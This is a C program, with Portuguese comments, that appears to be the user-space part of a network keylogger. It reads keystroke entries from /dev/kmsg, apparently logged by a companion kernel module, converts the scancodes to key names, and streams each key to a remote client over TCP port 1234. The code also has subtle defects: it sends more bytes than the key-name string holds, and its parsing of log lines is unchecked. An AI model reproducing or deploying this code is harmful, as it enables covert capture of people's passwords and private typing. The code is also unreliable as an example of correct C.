#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <fcntl.h>

#define BUFFER_SIZE 1024
#define SERVER_PORT 1234

#define NUM_TECLAS 128
const char* teclas[NUM_TECLAS] = {
    "Reservado",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "Menos",
    "Igual",
    "Backspace",
    "Tab",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "Acento Agudo",
    "Abre Colchete",
    "Enter",
    "Left Ctrl",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "C com cedilha",
    "Acento Agudo",
    "Aspa simples (')",
    "Left Shift",
    "Fecha Colchete",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "Virgula",
    "Ponto",
    "Ponto e virgula",
    "Right Shift",
    "Multiplicacao",
    "Left Alt",
    "Espaco",
    "Caps Lock",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "Num Lock",
    "Scroll Lock",
    "Tecla 7 (Num Pad)",
    "Tecla 8 (Num Pad)",
    "Tecla 9 (Num Pad)",
    "Subtracao (Num Pad)",
    "Tecla 4 (Num Pad)",
    "Tecla 5 (Num Pad)",
    "Tecla 6 (Num Pad)",
    "Soma (Num Pad)",
    "Tecla 1 (Num Pad)",
    "Tecla 2 (Num Pad)",
    "Tecla 3 (Num Pad)",
    "Tecla 0 (Num Pad)",
    "Ponto Decimal (Num Pad)",
    "Zenkaku/Hankaku",
    "102nd",
    "Contra barra ('\')",
    "F11",
    "F12",
    "Barra (/)",
    "Hiragana",
    "Henkan",
    "Katakana/Hiragana",
    "Muhenkan",
    "Virgula (Num Pad)",
    "Enter (Num Pad)",
    "Enter (Num Pad)",
    "Barra (Num Pad)",
    "Barra (Num Pad)",
    "Print Screen",
    "Alt Gr",
    "NULL",
    "Home",
    "Seta para Cima",
    "Page UP",
    "Seta para Esquerda",
    "Seta para Direita",
    "End",
    "Seta para Baixo",
    "Page Down",
    "NULL",
    "Macro",
    "Delete",
    "Volume Down",
    "Volume Up",
    "Power",
    "Igual (Num Pad)",
    "Mais/Menos (Num Pad)",
    "Pause",
    "Escala",
    "Virgula (Num Pad)",
    "Hangeul",
    "Hanja",
    "Yen",
    "Left Meta",
    "Comand (botao Windows)",
    "NULL"
};


void shiftStringByCount(char* string, int count) {
    if (count >= 0 && count < strlen(string)) {
        memmove(string, string + count, strlen(string) - count + 1);
    } else {
        string[0] = '\0';
    }
}

int findSemicolon(const char* string) {
    int position = -1;  // Default return value if semicolon is not found
    int i = 0;

    while (string[i] != '\0') {
        if (string[i] == ';') {
            position = i;
            break;
        }
        i++;
    }

    return position + 20;    //Retorna a posição do ; + caracteres do termo "Tecla pressionada: "
}

int main() {
    int fd;
    int sockfd, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len;
    fd_set fds;
    struct timeval timeout;

    // Abrir o arquivo /dev/kmsg
    fd = open("/dev/kmsg", O_RDONLY);
    if (fd < 0) {
        perror("Erro ao abrir o arquivo /dev/kmsg");
        exit(1);
    }

    // Cria o socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        perror("Erro ao criar o socket");
        exit(1);
    }

    // Configura os detalhes do servidor
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    // Associa o socket ao endereço e porta
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Erro ao fazer o bind");
        exit(1);
    }

    // Aguarda por conexões
    if (listen(sockfd, 1) == -1) {
        perror("Erro ao ouvir por conexões");
        exit(1);
    }

    printf("Servidor aguardando por conexões...\n");

    // Aceita a conexão do cliente
    client_addr_len = sizeof(client_addr);
    client_sock = accept(sockfd, (struct sockaddr *)&client_addr, &client_addr_len);
    if (client_sock == -1) {
        perror("Erro ao aceitar a conexão");
        exit(1);
    }

    printf("Cliente conectado!\n");

    off_t startPos = lseek(fd, 0, SEEK_END);  // Salvar a posição atual do arquivo

    while (1) {
        // Limpar o conjunto de descritores de arquivo
        FD_ZERO(&fds);
        FD_SET(fd, &fds);

        // Definir o tempo limite para 1 segundo
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        // Aguardar até que haja dados disponíveis para leitura
        if (select(fd + 1, &fds, NULL, NULL, &timeout) > 0) {
            // Verificar se o descritor de arquivo está pronto para leitura
            if (FD_ISSET(fd, &fds)) {
                char buffer[BUFFER_SIZE];
                ssize_t bytesRead;

                // Ler os dados do arquivo a partir da posição anterior
                bytesRead = read(fd, buffer, sizeof(buffer) - 1);
                if (bytesRead < 0) {
                    perror("Erro ao ler o arquivo /dev/kmsg");
                    exit(1);
                }

                if (bytesRead > 0) {
                    // Adicionar um terminador de string no final dos dados lidos
                    buffer[bytesRead] = '\0';

                    // Imprimir os dados lidos
                    printf("%s", buffer);

                    // Enviar dados para o cliente
                    int start = findSemicolon(buffer);
                    shiftStringByCount(buffer, start);
                    if(atoi(buffer) >= 127) strcpy(buffer, "126\0");
                    if (send(client_sock, teclas[atoi(buffer)], bytesRead, 0) == -1) {
                        perror("Erro ao enviar dados para o cliente");
                        exit(1);
                    }

                    // Atualizar a posição anterior para o final do arquivo
                    startPos = lseek(fd, 0, SEEK_CUR);
                }
            }
        }

        // Atualizar a posição atual para o final do arquivo
        startPos = lseek(fd, 0, SEEK_CUR);
    }

    // Fechar o descritor de arquivo
    close(fd);

    // Fecha a conexão com o cliente
    close(client_sock);

    // Fecha o socket do servidor
    close(sockfd);

    return 0;
}